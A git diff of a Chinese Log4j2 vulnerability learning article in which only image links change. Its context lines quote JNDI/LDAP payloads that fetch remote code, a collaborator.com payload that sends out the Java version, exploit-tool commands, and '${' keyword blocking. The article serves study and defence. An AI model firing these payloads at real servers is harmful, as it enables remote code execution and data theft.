@@ -72,11 +72,11 @@ vmvare
 
 从微信朋友圈的结果来看，此漏洞影响广泛，开源组件中有近两万项目使用该存在漏洞的模块，绝对是目前为止影响最为广泛的漏洞，堪比之前出现的 heartbleed（心脏滴血）漏洞。比如 vmvare 的公告：  
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3dx0wmEXNXB7icjpd9YT80Td4VYEnTWhfEgUkgnK0elhEeuIezG60SOw/640?wx_fmt=jpeg)
+![](../../.resource/remote/2deb4c5168a9e98885ac52254e3e0e80be410bae297b1310c0df209975678d60.jpg)
 
 至漏洞爆发开始，为了体现该漏洞的影响，甚至有了漏洞打地球的趣图，详情参考《[核弹级漏洞公开，昨晚你睡着了么？](https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247496216&idx=1&sn=2c85e1ad985e8a37c5ec2b7a5bded7cd&scene=21#wechat_redirect)》，除了文中的还有入侵汽车、借用 WIFI 名称钓鱼的，从线上到线下广泛应用：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3wk46YibiceY8dQ3QRtGceEmicRFhXLicibqH1c33I9ZM1pYY0vkgVNEQxtg/640?wx_fmt=png)
+![](../../.resource/remote/3f3327594a19b7f45dcaaad959b6e041b448eb378cb8050169ff6878a6cf2a12.png)
 
 看到这里，这个漏洞是不是很好玩儿？
 
@@ -336,7 +336,7 @@ ${jndi:ldap://xxx.xxx.xxx.xxx/exp}
 
 最终效果就是通过 jndi 注入，借助 ldap 服务来下载执行恶意 payload，从而执行命令，整个利用流程如图：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3E9fVD3yAapXpYvcnurL1HLwOd8WpCYicnQIx2xlwbagwhtfLZyRniaqQ/640?wx_fmt=png)
+![](../../.resource/remote/42656e70d909eaebb4eab36e76d2d848e84d3a85ffeccfc38e75a08cb81a625c.png)
 
 整个利用流程分两步：
 
@@ -421,7 +421,7 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "C:\Windows\WinSxS\wow6
 
 3、根据 cmd 日志拼接 log4j2 打印的日志
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3jZGNuLxuzOGLmfeciavYBznRKEHAUibRB6V3oQFw11nlFpG2Gvh8iaxbg/640?wx_fmt=png)
+![](../../.resource/remote/34907eec6a3603770b39f4c8fb8f48562e6112d217018b5fe74b43ead3da5c14.png)
 
 由控制台打印的日志可知，jdk1.8 ldap 协议的临时生成的类为 kk1i3g，log4j 日志打印
 
@@ -431,7 +431,7 @@ ${jndi:ldap://127.0.0.1:1389/kk1i3g}
 
 4、运行 main 入口类，打印 log4j2 日志，弹出计算器  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3V4SerzwxR2KGJrQY9XZcDzhIATBrC8NvpqYmlWjI7Hf9d1Rmeqqo2w/640?wx_fmt=png)
+![](../../.resource/remote/b2e3732cd73340fa62a5013d12f7c3e65a83ab9549acb2c6856deca9cdbabd60.png)
 
 ##### 方法二：根据 jndi 注入原理自己编写
 
@@ -500,11 +500,11 @@ public class Server {
 
 加了两个文件的目录结构为：  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3UYwZ4DqqKaM0icx9I6ib11vP0IlhLVe1YGtmqOl9q2XsSLWjbVvdoibXg/640?wx_fmt=png)
+![](../../.resource/remote/a9a656e3ddd16edc70f8248e89b8432655e00cb306dfc5c3039f40a858132b22.png)
 
 4、在编译好的 EvilObj 目录下 cmd，执行 `python -m http.server 6666` 打开 http 服务（在本地其实不打开也访问的到）
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3Rg2O6xQgkhuBDDUAOsv0F61CrqicEqSxYcWrpgaiao5BONbkg0reLrTw/640?wx_fmt=png)
+![](../../.resource/remote/786ce52c5846aae5660d683f51b09505755e256b39fd300c0ed26a328a4734e1.png)
 
 5、log4j 的 main 方法打印 
 
@@ -512,13 +512,13 @@ public class Server {
 
 6、启动 Server，启动 log4j，弹出计算器
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v340jAuCOsAUl9mCWLtZ1iaQkneu5PHWIadOqxWOibgbzd2Rd3ZFboaaTw/640?wx_fmt=png)
+![](../../.resource/remote/e918e6cb0457010e1389ecec02164614e0c13a1c0d074084ed3597efea3e3f10.png)
 
 ##### 方法三：利用 dnslog 检测并外带数据
 
 1、访问 https://log.xn--9tr.com/，点击 Get SubDomain 获取域名（当然也可以选择其他平台，比如 dnslog、ceye 等）：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3ibW1icRWWAMfjaux7gtPdJpB4lsF9JoyFOQE8LjlIApjD15gZ0ln0lnw/640?wx_fmt=png)
+![](../../.resource/remote/84f168f5d1b16570a7e4d33a84c8013a81e0739b4c946c2d0072ae4b4cbdc3cb.png)
 
 2、拼接日志（将域名加进日志里面）
 
@@ -535,7 +535,7 @@ public class log4j {
 
 3、直接运行步骤 2 的类，浏览器点击 Refresh Record，在浏览器看到回显  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3qfUb4BN3AvEbj3icejmmQPmRj2VuqexmJ0udKUZ4crJGXz6wmU5icnHQ/640?wx_fmt=png)
+![](../../.resource/remote/f93bf9c5c67c5e9c295d38ce6a8e6db7e9767e408ac72ef1aa87960534fc8a62.png)
 
 4、外带数据的 payload：
 
@@ -545,7 +545,7 @@ ${jndi:ldap://${sys:java.version}.collaborator.com}
 
 可以获取的数据如图：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3220TsYAtUxobK7LpD0dIQAhGdCQ53G0licx1bBW2u0AVZw8AiaZGaeOQ/640?wx_fmt=png)
+![](../../.resource/remote/252c312cda09f1caa24f8a31de5f84d695225b527c72b0fb88c64784688e073d.png)
 
 **总结: 学习推荐自己实现，不要太依耐工具，实际测试为了效率可以使用工具**
 
@@ -557,11 +557,11 @@ ${jndi:ldap://${sys:java.version}.collaborator.com}
 
 > https://github.com/takito1812/log4j-detect/blob/main/log4j-detect.py
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v38tHzCbrW1GGTpDVlwZhxn3ESicz7uo3TSHcmibqGx54ORmC5XZCcoKfA/640?wx_fmt=png)
+![](../../.resource/remote/a0efe8b8f090a927542fd130272a6d24c98a74c19131a9476a8e3576cb4f4fab.png)
 
 主要在 header 和 参数中增加 payload 进行漏洞触发，可以结合 dnslog 平台实现自动化漏洞发现，攻击图如下：
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3KbmCtpkakz2hiaYvrXEZsLZFlwJRfEZadILCo9Hnia3LBHhTpNTkqn0Q/640?wx_fmt=jpeg)
+![](../../.resource/remote/1086958002c26bb0c34635231d68cf3602caeb1150d35327b9acd3851572860f.jpg)
 
 #### 对于白盒来说如何发现存在漏洞的系统
 
@@ -571,7 +571,7 @@ ${jndi:ldap://${sys:java.version}.collaborator.com}
 
 > https://log4j2.huoxian.cn/layout
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3nwJXyzAx2hWzfnRWnsFg5P4rw4XvHGicOiaOXVd40yTfuY07er8rFuBw/640?wx_fmt=png)
+![](../../.resource/remote/a74a1d162b8822b4964438412f5e92680174785bcc4af7ec8b80e9998b48bc72.png)
 
 就是企业越大，系统越多，更新的过程越复杂，需要测试调试的时间越多，尽量避免因为修复漏洞而导致系统故障。  
 
@@ -590,7 +590,7 @@ ${jndi:ldap://${sys:java.version}.collaborator.com}
 
 案例：
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3NOoGq84ObABzLoM9moKOIER0XvicmOw6oqtDibKRpY5zOpFkp4yv6Kng/640?wx_fmt=jpeg)
+![](../../.resource/remote/72a99a500cd6b358d666ae1f7484776d36eed3bba60f89210601ebea71de1023.jpg)
 
 ‍2、`${` 关键词拦截（范围大且容易产生误报，且不能真正解决，漏洞的触发点是在打印日志的时候把可控内容携带进去了）  
 
@@ -602,7 +602,7 @@ ${jndi:ldap://${sys:java.version}.collaborator.com}
 
 效果如图：  
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3S5HrwZD0DAvTxD0FE5MGbpP0EX8jPAA1pEOxqX1sP1rwePTibPoTZyQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/11b165fea885bdb342c124184f616bf46ff6d47e1f32b5bd753efe97edde1872.jpg)
 
 临时方案治标不治本，只能争取时间，从根源上测地消灭漏洞。
 
@@ -610,11 +610,11 @@ ${jndi:ldap://${sys:java.version}.collaborator.com}
 
 随着漏洞的公开，在野利用该漏洞获取权限并进行挖矿勒索的案例已然出现，比如奇安信检测到的情况，详情[《警惕！Log4j2 漏洞已被多个僵尸网络家族利用》](https://mp.weixin.qq.com/s?__biz=Mzg4OTU4MjQ4Mg==&mid=2247485419&idx=1&sn=a8fccee9a7b0a364f9b7831bd41f4961&scene=21#wechat_redirect)，漏洞触发条件是在 url 中带入 payload：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lG0evzxL96kAOhic5XI66L7vSTx8l0l5S0iaqcYM4P2MSmwTd5zMV9W73V1RKNk4Q2z2bysZ4qaF7Nj7fQcLxiavA/640?wx_fmt=png)
+![](../../.resource/remote/922933704e8817f5437c684c6f652583030b2ce47a862827ded1ecd329a01e79.png)
 
 漏洞利用成功后会加入 SSH 公钥，这个特征还比较明显，容易拦截。比如绿盟科技检测到的情况，详情[《Log4j2 修补时间差！挖矿软件和僵尸网络乘虚而入》](https://mp.weixin.qq.com/s?__biz=Mzg2MDUxMjQxMg==&mid=2247486472&idx=1&sn=228de4ea7e0890292f49c73f09973d30&scene=21#wechat_redirect)，payload 及利用如图：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfdoQ7rHvra6IziaKpJEfj7v3LpvU2dmmG97rGsDF4MdYia4MhiciaHibKUibicXCgZqs78sFkJNvgCLWwAGg/640?wx_fmt=png)
+![](../../.resource/remote/84f3cb3093c129a2a43c73f11b4c4047bf515f93bc1344773c8239c2327d65d8.png)
 
 我相信，在野利用绝非检测到的这些方式，还有更多想不到的利用方式，这个也会长期存在。
 
@@ -638,7 +638,7 @@ ${jndi:ldap://${sys:java.version}.collaborator.com}
 
 没想到我会因为一句 logger.error 写这么多，其实如果是其它级别的日志只要能打印应该也是可以利用，至于什么级别的打印其实是可以自己配置的，我的第一个 1day 就这样总结完了，感谢良哥，分享了一下 log4j 漏洞成因，说实话那时候看的是有点蒙，点进去像套娃一样。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAfevAYoFGk9bWfkmrDQo0X64uMdoQib6IvgWKic6NC0LWeIic4SQVticjBSmSiaPKRBlnjM9KQHaBed6NqQ/640?wx_fmt=png)
+![](../../.resource/remote/1cfe82782a1a7069bca6bca8faebef6080ecd27d15d75b0574895536e0cafb76.png)
 
 ---
 
